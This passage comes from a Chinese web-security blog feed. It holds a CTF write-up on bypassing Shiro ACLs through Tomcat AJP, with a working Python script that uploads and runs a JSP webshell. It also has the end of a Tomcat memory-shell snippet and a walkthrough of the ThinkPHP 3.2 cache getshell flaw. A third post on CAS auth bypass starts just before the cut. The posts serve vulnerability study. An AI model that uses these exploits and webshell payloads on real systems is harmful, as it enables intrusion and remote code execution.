servletContext.addFilter(name, filter);</span><br><span class="line">                filterRegistration.addMappingForUrlPatterns(java.util.EnumSet.of(javax.servlet.DispatcherType.REQUEST), <span class="literal">false</span>,<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;url&#125;);</span><br><span class="line">                java.lang.reflect.<span class="type">Method</span> <span class="variable">filterStartMethod</span> <span class="operator">=</span> org.apache.catalina.core.StandardContext.class.getMethod(<span class="string">&quot;filterStart&quot;</span>);</span><br><span class="line">                filterStartMethod.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                filterStartMethod.invoke(standardContext, <span class="literal">null</span>);</span><br><span class="line">                stateField.set(standardContext,org.apache.catalina.LifecycleState.STARTED);</span><br><span class="line">            &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">                ;</span><br><span class="line">            &#125;<span class="keyword">finally</span> &#123;</span><br><span class="line">                stateField.set(standardContext,org.apache.catalina.LifecycleState.STARTED);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="ajp越权的shiro-acl">ajp越权的shiro acl</h3>
<p>这一点后面的提示也给出来了，可以用<a href="https://gv7.me/articles/2020/how-to-detect-tomcat-ajp-lfi-more-accurately">how-to-detect-tomcat-ajp-lfi-more-accurately</a>提到的办法，也可以用我之前提交的<a href="https://gv7.me/articles/2020/how-to-detect-tomcat-ajp-lfi-more-accurately">SHIRO-760</a>。poc在issue里面已经给了，漏洞的demo环境在<a href="https://github.com/cL0und/srpingboot-shiro">我github</a>上可以找到，这里借这个机会分享一下当时挖掘的思路。</p>
<p>通过分析<a href="https://www.freebuf.com/vuls/231909.html">前人的文章</a>可以知道，我们可以知道在org.apache.shiro.web.util.WebUtils#getPathWithinApplication内部会对requestUri进行提取并交给patchMatches匹配以判断是否需要鉴权。<br>
<img src="1594001505206-b96ba60b-1607-4ff5-91d4-8d7ad1c551f7.png#align=left&amp;display=inline&amp;height=293&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=586&amp;originWidth=1492&amp;size=199627&amp;status=done&amp;style=none&amp;width=746" alt="image.png"><br>
多次步入后，可以看到具体的获取uri的实现是其中的getRequestUri。getRequestUri首先会获取javax.servlet.include.request_uri的值如果获取到了就不会进入 <code>if (uri == null)</code> 。<br>
<img src="1594001525231-a1227a7d-bdc1-477f-8f4c-4f84030bff82.png#align=left&amp;display=inline&amp;height=242&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=484&amp;originWidth=1492&amp;size=183925&amp;status=done&amp;style=none&amp;width=746" alt="image.png"><br>
而如果有师傅看过shiro上一次对越权的修复的话会发现，补丁是打在<code>if (uri == null)</code>中的，通过ajp控制<code>javax.servlet.include.request_uri</code>相当于绕过上一次的补丁点。<br>
<img src="1594001543733-534c473f-b23f-47f6-8449-dfc4a8a14f69.png#align=left&amp;display=inline&amp;height=239&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=478&amp;originWidth=1492&amp;size=139177&amp;status=done&amp;style=none&amp;width=746" alt="image.png"><br>
接着这里提取出来的uri<code>/;/admin/page</code>会进入decodeAndCleanUriString中进行清洗。decodeAndCleanUriString会取分号前的内容返回。<br>
<img src="1594001562448-3aaf5fc7-2aaa-4c45-a01e-990b3ab64cf1.png#align=left&amp;display=inline&amp;height=72&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=143&amp;originWidth=1492&amp;size=76386&amp;status=done&amp;style=none&amp;width=746" alt="image.png"><br>
在这里返回的就是<code>/</code>，后面shiro的正则<code>/admin/*</code>自然也就拦截不了。</p>
<p>此外，光绕过shiro还不行，spring不解析这条路由也没用，一个开始我也为用前人文章中的 <code>/xxxx;/../</code> 可以轻松绕过，黑盒发现并不行。分析ajp漏洞的时候我们知道，tomcat先调用对所有filter进行过滤然后会调用对应的servlet，而在spring都是统一由DispatcherServlet进行统一调度的。所以一开始我选择把断点打到org.springframework.web.servlet.FrameworkServlet#doGet（<em>DispatcherServlet继承FrameworkServlet</em>）。又因为spring是通过HandlerMapping来找对应的控制器，所以步入断点之后就开始找哪个地方有这个逻辑。最后在/org/springframework/web/servlet/DispatcherServlet.class:484找到。<br>
<img src="1594001660546-d8b7972b-9bb0-41cd-9b2c-37aa410d37d6.png#align=left&amp;display=inline&amp;height=391&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=782&amp;originWidth=1492&amp;size=329488&amp;status=done&amp;style=none&amp;width=746" alt="image.png"><br>
步入之后spring把已经注册过Mapping轮询一次。在代码中我们用的@GetMapping这里就对应ReuqestMappingHandlerMapping。<br>
<img src="1594001700248-56346a95-e72b-4a02-a020-7b80d006a673.png#align=left&amp;display=inline&amp;height=411&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=822&amp;originWidth=1492&amp;size=243393&amp;status=done&amp;style=none&amp;width=746" alt="image.png"><br>
步入ReuqestMappingHandlerMapping之后再多次步入，最后来到org.springframework.web.util.UrlPathHelper#getPathWithinApplication<br>
<img src="1594001720564-fc1f7a9c-b4ef-40ac-9601-f02cd5a74ee4.png#align=left&amp;display=inline&amp;height=163&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=325&amp;originWidth=1492&amp;size=183407&amp;status=done&amp;style=none&amp;width=746" alt="image.png"><br>
这里三个箭头是关键的三个点，第一个箭头会对uri提取并“消杀”，第二个箭头会去pathWithinApp中servletPath之后的内容。第三个箭头返回path交给HandlerMapping匹配。</p>
<p>我们先来看第一个箭头“消杀”的步骤。<br>
<img src="1594001748419-fe37e159-a3ac-4b7b-b5e2-2459cd4d7e54.png#align=left&amp;display=inline&amp;height=126&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=252&amp;originWidth=1492&amp;size=73032&amp;status=done&amp;style=none&amp;width=746" alt="image.png"><br>
<img src="1594001754187-5c2a028f-f2c4-4846-9993-167ef84f4c21.png#align=left&amp;display=inline&amp;height=93&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=186&amp;originWidth=1492&amp;size=71193&amp;status=done&amp;style=none&amp;width=746" alt="image.png"><br>
上图removeSemicolonContent会移除uri中<code>;</code>，<code>/;/admin/page</code>变为<code>//admin/page</code>。getSanitizedPath会对移除重复的<code>/</code>， <code>//admin/page</code> 变为 <code>/admin/page</code> （<em>ps：这里并不会处理…及.这也是为啥老payload /xxx;/…/无法用的原因，虽然可以绕过但是之后spring handlerMapping匹配不到。</em>）</p>
<p>再来第二个箭头，这个getRemainingPath会提取处Uri中conextPath之后的部分。举个反例如果我们把<code>javax.servlet.include.servlet_path</code>设置为<code>/</code>，那么返回给HandlerMapping将会是 <code>admin/page</code> ，而HandlerMapping只会匹配<code>/admin/page</code>这也是为什么<code>javax.servlet.include.servlet_path</code>需要置为空的原因。</p>
<p>回过头看漏洞本质还是在于spring和shiro在规范消杀url时标准不一致造成的问题。因为最新版的tomcat已经默认把ajp关了，并且在反代情况下tomcat 8009也不会对外开放所以这个洞的利用还是受很大限制的。</p>
<h3 id="ajp上传文件">ajp上传文件</h3>
<p>因为网上ajp协议讨论较少，和exp有关的只有CVE-2020-1938，不过payload的构造比较单一并不涉及到上传文件的请求，网上应该也没有介绍相关的文章。那要怎么通过ajp传？我预想的思路是选手通过阅读相关类库来解决比如<a href="https://github.com/hypn0s/AJPy">AJPy</a>，在tomcat.py中提供了一种部署war包getshell的操作，这里面就有上传文件的操作，可以借鉴。<br>
<img src="1594002267067-acd0c056-d4bf-46f6-8187-192f0244dc41.png#align=left&amp;display=inline&amp;height=618&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=1236&amp;originWidth=2380&amp;size=320042&amp;status=done&amp;style=none&amp;width=1190" alt="image.png"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"><span class="keyword">from</span> ajpy.ajp <span class="keyword">import</span> AjpResponse, AjpForwardRequest, AjpBodyRequest, NotFoundException</span><br><span class="line"><span class="keyword">from</span> tomcat <span class="keyword">import</span> Tomcat</span><br><span class="line"></span><br><span class="line">target_host = <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">gc = Tomcat(target_host, <span class="number">8009</span>)</span><br><span class="line"></span><br><span class="line">filename = <span class="string">&quot;shell.jpg&quot;</span></span><br><span class="line">payload = <span class="string">&quot;&lt;% out.println(new java.io.BufferedReader(new java.io.InputStreamReader(Runtime.getRuntime().exec(\&quot;cat /flag.txt\&quot;).getInputStream())).readLine()); %&gt;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;/tmp/request&quot;</span>, <span class="string">&quot;w+b&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    s_form_header = <span class="string">&#x27;------WebKitFormBoundaryb2qpuwMoVtQJENti\r\nContent-Disposition: form-data; name=&quot;file&quot;; filename=&quot;%s&quot;\r\nContent-Type: application/octet-stream\r\n\r\n&#x27;</span> % filename</span><br><span class="line">    s_form_footer = <span class="string">&#x27;\r\n------WebKitFormBoundaryb2qpuwMoVtQJENti--\r\n&#x27;</span></span><br><span class="line">    f.write(s_form_header.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    f.write(payload.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    f.write(s_form_footer.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line">data_len = os.path.getsize(<span class="string">&quot;/tmp/request&quot;</span>)</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">        <span class="string">&quot;SC_REQ_CONTENT_TYPE&quot;</span>: <span class="string">&quot;multipart/form-data; boundary=----WebKitFormBoundaryb2qpuwMoVtQJENti&quot;</span>,</span><br><span class="line">        <span class="string">&quot;SC_REQ_CONTENT_LENGTH&quot;</span>: <span class="string">&quot;%d&quot;</span> % data_len,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">attributes = [</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="string">&quot;name&quot;</span>: <span class="string">&quot;req_attribute&quot;</span></span><br><span class="line">        , <span class="string">&quot;value&quot;</span>: (<span class="string">&quot;javax.servlet.include.request_uri&quot;</span>, <span class="string">&quot;/;/admin/upload&quot;</span>, )</span><br><span class="line">    &#125;</span><br><span class="line">    , &#123;</span><br><span class="line">        <span class="string">&quot;name&quot;</span>: <span class="string">&quot;req_attribute&quot;</span></span><br><span class="line">        , <span class="string">&quot;value&quot;</span>: (<span class="string">&quot;javax.servlet.include.path_info&quot;</span>, <span class="string">&quot;/&quot;</span>, )</span><br><span class="line">    &#125;</span><br><span class="line">    , &#123;</span><br><span class="line">        <span class="string">&quot;name&quot;</span>: <span class="string">&quot;req_attribute&quot;</span></span><br><span class="line">        , <span class="string">&quot;value&quot;</span>: (<span class="string">&quot;javax.servlet.include.servlet_path&quot;</span>, <span class="string">&quot;&quot;</span>, )</span><br><span class="line">    &#125;</span><br><span class="line">, ]</span><br><span class="line"></span><br><span class="line">hdrs, data = gc.perform_request(<span class="string">&quot;/&quot;</span>, headers=headers, method=<span class="string">&quot;POST&quot;</span>,  attributes=attributes)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;/tmp/request&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    br = AjpBodyRequest(f, data_len, AjpBodyRequest.SERVER_TO_CONTAINER)</span><br><span class="line">    responses = br.send_and_receive(gc.socket, gc.stream)</span><br><span class="line"></span><br><span class="line">r = AjpResponse()</span><br><span class="line">r.parse(gc.stream)</span><br><span class="line"></span><br><span class="line">shell_path = r.data.decode(<span class="string">&#x27;utf-8&#x27;</span>).strip(<span class="string">&#x27;\x00&#x27;</span>).split(<span class="string">&#x27;/&#x27;</span>)[-<span class="number">1</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;=&quot;</span>*<span class="number">50</span>)</span><br><span class="line"><span class="built_in">print</span>(shell_path)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;=&quot;</span>*<span class="number">50</span>)</span><br><span class="line"></span><br><span class="line">gc = Tomcat(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">8009</span>)</span><br><span class="line"></span><br><span class="line">attributes = [</span><br><span class="line">    &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;req_attribute&quot;</span>, <span class="string">&quot;value&quot;</span>: (<span class="string">&quot;javax.servlet.include.request_uri&quot;</span>, <span class="string">&quot;/&quot;</span>,)&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;req_attribute&quot;</span>, <span class="string">&quot;value&quot;</span>: (<span class="string">&quot;javax.servlet.include.path_info&quot;</span>, shell_path,)&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;req_attribute&quot;</span>, <span class="string">&quot;value&quot;</span>: (<span class="string">&quot;javax.servlet.include.servlet_path&quot;</span>, <span class="string">&quot;/&quot;</span>,)&#125;,</span><br><span class="line">]</span><br><span class="line">hdrs, data = gc.perform_request(<span class="string">&quot;/uploads/1.jsp&quot;</span>, attributes=attributes)</span><br><span class="line">output = sys.stdout</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> d <span class="keyword">in</span> data:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        output.write(d.data.decode(<span class="string">&#x27;utf8&#x27;</span>))</span><br><span class="line">    <span class="keyword">except</span> UnicodeDecodeError:</span><br><span class="line">        output.write(<span class="built_in">repr</span>(d.data))</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>web security</category>
      </categories>
      <tags>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title>TP框架3.2缓存漏洞</title>
    <url>/2017/08/20/TP%E6%A1%86%E6%9E%B63.2%E7%BC%93%E5%AD%98%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<!-- 之前学php的时候就对php里面的缓存技术很疑惑，前些日子爆出的[thinkphp缓存getshell漏洞](https://xianzhi.aliyun.com/forum/read/1973.html)看着大佬追了一便代码，自己也想尝试追一下，顺便了解一下何为缓存。实验用的是TP3.2有此漏洞的版本。 -->
<!-- more -->
<h2 id="何为缓存？">何为缓存？</h2>
<p>具体<a href="http://www.thinkphp.cn/code/1579.html">http://www.thinkphp.cn/code/1579.html</a></p>
<p>简单的说就是减少服务器压力，将用户常见的的网页事先静态存储好。个人认为，一般情况下TP用的是数据缓存，即将数据缓存到一个php文件中，文件名包含一个id来唯一标示（TP中是一个md5值）</p>
<h2 id="搭建环境">搭建环境</h2>
<h3 id="配置数据库">配置数据库</h3>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> database article</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> article (</span><br><span class="line">content <span class="type">VARCHAR</span>(<span class="number">255</span>)</span><br><span class="line">);</span><br><span class="line"><span class="string">&#x27;DB_NAME&#x27;</span> <span class="operator">=</span><span class="operator">&gt;</span> <span class="string">&#x27;aritcle&#x27;</span> <span class="comment">-- 在config.php中添加该键值对</span></span><br></pre></td></tr></table></figure>
<h3 id="写入代码">写入代码</h3>
<p>修改home/controller/indexController.class.php 如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Home</span>\<span class="title class_">Controller</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IndexController</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;welcome&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">save</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="variable">$content</span> = <span class="keyword">array</span>(<span class="string">&#x27;content&#x27;</span> =&gt; <span class="title function_ invoke__">I</span>(<span class="string">&#x27;get.content&#x27;</span>));</span><br><span class="line">		<span class="variable">$amodel</span> = <span class="title function_ invoke__">M</span>(<span class="string">&#x27;article&#x27;</span>);</span><br><span class="line">		<span class="variable">$amodel</span>-&gt;<span class="title function_ invoke__">data</span>(<span class="variable">$content</span>)-&gt;<span class="title function_ invoke__">add</span>();</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">cache</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="variable">$amodel</span> = <span class="title function_ invoke__">M</span>(<span class="string">&#x27;article&#x27;</span>);</span><br><span class="line">		<span class="variable">$content</span> = <span class="variable">$amodel</span>-&gt;<span class="title function_ invoke__">select</span>();</span><br><span class="line">		<span class="title function_ invoke__">var_dump</span>(<span class="variable">$content</span>);</span><br><span class="line">		<span class="title function_ invoke__">S</span>(<span class="string">&#x27;content&#x27;</span>,<span class="variable">$content</span>,<span class="number">3600</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="缓存函数用法">缓存函数用法</h2>
<p>在TP3.2版本中，起缓存功能的是S函数，用法如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 使用data标识缓存$Data数据</span></span><br><span class="line"><span class="title function_ invoke__">S</span>(<span class="string">&#x27;data&#x27;</span>,<span class="variable">$Data</span>);  <span class="comment">//前面的是缓存标示，后面的是缓存的数据</span></span><br><span class="line"><span class="comment">// 缓存$Data数据3600秒</span></span><br><span class="line"><span class="title function_ invoke__">S</span>(<span class="string">&#x27;data&#x27;</span>,<span class="variable">$Data</span>,<span class="number">3600</span>);</span><br><span class="line"><span class="comment">// 删除缓存数据</span></span><br><span class="line"><span class="title function_ invoke__">S</span>(<span class="string">&#x27;data&#x27;</span>,<span class="literal">NULL</span>);  <span class="comment">//第一个参数时缓存的标识名</span></span><br></pre></td></tr></table></figure>
<h2 id="下面为第一次创建缓存（理想情况下）的代码跟踪">下面为第一次创建缓存（理想情况下）的代码跟踪</h2>
<p>跟进S函数</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 缓存管理</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> mixed $name 缓存名称，如果为数组表示进行缓存设置</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> mixed $value 缓存值</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> mixed $options 缓存参数</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> mixed</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">S</span>(<span class="params"><span class="variable">$name</span>,<span class="variable">$value</span>=<span class="string">&#x27;&#x27;</span>,<span class="variable">$options</span>=<span class="literal">null</span></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">static</span> <span class="variable">$cache</span>   =   <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">	<span class="comment">/*省略*/</span></span><br><span class="line">    &#125;<span class="keyword">elseif</span>(<span class="keyword">empty</span>(<span class="variable">$cache</span>)) &#123; <span class="comment">// 自动初始化</span></span><br><span class="line">        <span class="variable">$cache</span>      =   <span class="title class_">Think\Cache</span>::<span class="title function_ invoke__">getInstance</span>();<span class="comment">//创建缓存时从这里进入</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="string">&#x27;&#x27;</span>=== <span class="variable">$value</span>)&#123; <span class="comment">// 获取缓存</span></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$cache</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="variable">$name</span>);</span><br><span class="line">    &#125;<span class="keyword">elseif</span>(<span class="title function_ invoke__">is_null</span>(<span class="variable">$value</span>)) &#123; <span class="comment">// 删除缓存</span></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$cache</span>-&gt;<span class="title function_ invoke__">rm</span>(<span class="variable">$name</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123; <span class="comment">// 缓存数据</span></span><br><span class="line">        <span class="comment">/*省略*/</span></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$cache</span>-&gt;<span class="title function_ invoke__">set</span>(<span class="variable">$name</span>, <span class="variable">$value</span>, <span class="variable">$expire</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>创建缓存时进入<code>Think\Cache::getInstance()</code>，这个方法检索静态数组是否已经有缓存实例，如果有就返回，没有则创建。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 取得缓存类实例</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@static</span></span></span><br><span class="line"><span class="comment"> * <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> mixed</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getInstance</span>(<span class="params"><span class="variable">$type</span>=<span class="string">&#x27;&#x27;</span>,<span class="variable">$options</span>=<span class="keyword">array</span>(<span class="params"></span>)</span>) </span>&#123;</span><br><span class="line">      <span class="built_in">static</span> <span class="variable">$_instance</span>	=	<span class="keyword">array</span>();<span class="comment">//静态变量，储存所有创建的缓存实例</span></span><br><span class="line">      <span class="variable">$guid</span>	=	<span class="variable">$type</span>.<span class="title function_ invoke__">to_guid_string</span>(<span class="variable">$options</span>);<span class="comment">//返回一个md5编号，以待稍后作为数组键值</span></span><br><span class="line">      <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_instance</span>[<span class="variable">$guid</span>]))&#123;<span class="comment">//如果缓存实例不存在则创建</span></span><br><span class="line">          <span class="variable">$obj</span>	=	<span class="keyword">new</span> <span class="title class_">Cache</span>();</span><br><span class="line">          <span class="variable">$_instance</span>[<span class="variable">$guid</span>]	=	<span class="variable">$obj</span>-&gt;<span class="title function_ invoke__">connect</span>(<span class="variable">$type</span>,<span class="variable">$options</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> <span class="variable">$_instance</span>[<span class="variable">$guid</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>md5标识号生成方式</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 根据PHP各种类型变量生成唯一标识号</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> mixed $mix 变量</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> string</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">to_guid_string</span>(<span class="params"><span class="variable">$mix</span></span>) </span>&#123;</span><br><span class="line">    <span class="comment">/*省略*/</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$mix</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$mix</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">md5</span>(<span class="variable">$mix</span>);<span class="comment">//返回一个序列化的md5值</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>跟进<code>$obj-&gt;connect($type,$options);</code>这个方法是在配置一些初始值，比如缓存的类型，路径信息</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 连接缓存</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> string $type 缓存类型</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> array $options  配置数组</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> object</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">connect</span>(<span class="params"><span class="variable">$type</span>=<span class="string">&#x27;&#x27;</span>,<span class="variable">$options</span>=<span class="keyword">array</span>(<span class="params"></span>)</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$type</span>))  <span class="variable">$type</span> = <span class="title function_ invoke__">C</span>(<span class="string">&#x27;DATA_CACHE_TYPE&#x27;</span>);<span class="comment">//如果为$type空，默认缓存类型为FILE</span></span><br><span class="line">    <span class="variable">$class</span>  =   <span class="title function_ invoke__">strpos</span>(<span class="variable">$type</span>,<span class="string">&#x27;\\&#x27;</span>)? <span class="variable">$type</span> : <span class="string">&#x27;Think\\Cache\\Driver\\&#x27;</span>.<span class="title function_ invoke__">ucwords</span>(<span class="title function_ invoke__">strtolower</span>(<span class="variable">$type</span>));            </span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">class_exists</span>(<span class="variable">$class</span>))</span><br><span class="line">        <span class="variable">$cache</span> = <span class="keyword">new</span> <span class="variable">$class</span>(<span class="variable">$options</span>); </span><br><span class="line">        <span class="comment">//  实例化Think\Cache\Driver\FILE</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="title function_ invoke__">E</span>(<span class="title function_ invoke__">L</span>(<span class="string">&#x27;_CACHE_TYPE_INVALID_&#x27;</span>).<span class="string">&#x27;:&#x27;</span>.<span class="variable">$type</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$cache</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>最后一步写入缓存</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 写入缓存</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> string $name 缓存变量名</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> mixed $value  存储数据</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> int $expire  有效时间 0为永久</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> boolean</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">set</span>(<span class="params"><span class="variable">$name</span>,<span class="variable">$value</span>,<span class="variable">$expire</span>=<span class="literal">null</span></span>) </span>&#123;</span><br><span class="line">	<span class="comment">/*省略*/</span></span><br><span class="line">	<span class="variable">$filename</span>   =   <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">filename</span>(<span class="variable">$name</span>);<span class="comment">//生成文件名，理想情况下MD5(&#x27;content&#x27;)</span></span><br><span class="line">   	<span class="comment">/*省略*/</span></span><br><span class="line">    <span class="variable">$data</span>   =   <span class="title function_ invoke__">serialize</span>(<span class="variable">$value</span>);</span><br><span class="line">    <span class="comment">/*省略*/</span></span><br><span class="line">    <span class="variable">$data</span>    = <span class="string">&quot;&lt;?php\n//&quot;</span>.<span class="title function_ invoke__">sprintf</span>(<span class="string">&#x27;%012d&#x27;</span>,<span class="variable">$expire</span>).<span class="variable">$check</span>.<span class="variable">$data</span>.<span class="string">&quot;\n?&gt;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span>  =   <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>,<span class="variable">$data</span>);</span><br><span class="line">    <span class="comment">/*省略*/</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>关键点在<code>&lt;?php\n//&quot;.sprintf('%012d',$expire).$check.$data.&quot;\n?&gt;</code></p>
<p>理想情况下这里的利用条件得天独厚，因为两个尖括号都写好了，不用担心I函数过滤的问题。而其中的data就是传入进去的一句话：</p>
<p>在Runtime/Temp下 getshell</p>
<p><img src="%E6%8D%95%E8%8E%B74.PNG" alt="捕获4.PNG"></p>
<h2 id="最后">最后</h2>
<p>文中一直提到是理想情况，这里解释一下，跟踪的时候省略了一些代码，其中有的是利用的前提条件，举个例子，文中提到理想情况下webshell文件名是MD5(‘content’)即<code>9a0364b9e99bb480dd25e1f0284c8555</code>/原因是TP中有一个给MD5值加盐的参数可以在配置文件中申明<code>DATA_CACHE_KEY</code>，如果管理员事先设置了这个参数，文件名就会变得不可猜，具体如下</p>
<p>还有一些前提条件，例如Runtime不在web目录内，一般情况也是利用不了的。</p>
<p><strong>如何出错，恳请指点</strong></p>
]]></content>
      <categories>
        <category>web security</category>
      </categories>
      <tags>
        <tag>web cache</tag>
      </tags>
  </entry>
  <entry>
    <title>Two Tricks Of CAS-CLIENT AUTH Bypass</title>
    <url>/2021/08/31/Two-Tricks-Of-CAS-CLIENT-AUTH-Bypass/</url>
    <content><![CDATA[<p>首发于<a href="https://xz.aliyun.com/t/9557">先知社区</a></p>
<!-- more -->
<p>cas client 用于限制匿名用户对某些特定api的访问，在一些特殊的环境下可能会有权限绕过问题。下面分享两个实际生活中遇到的案例。</p>
<h2 id="bypass-trick1-ignorePattern">bypass trick1 ignorePattern</h2>
<h3 id="场景">场景</h3>
<p>/api/admin这个url是需要cas登陆才能访问的。</p>
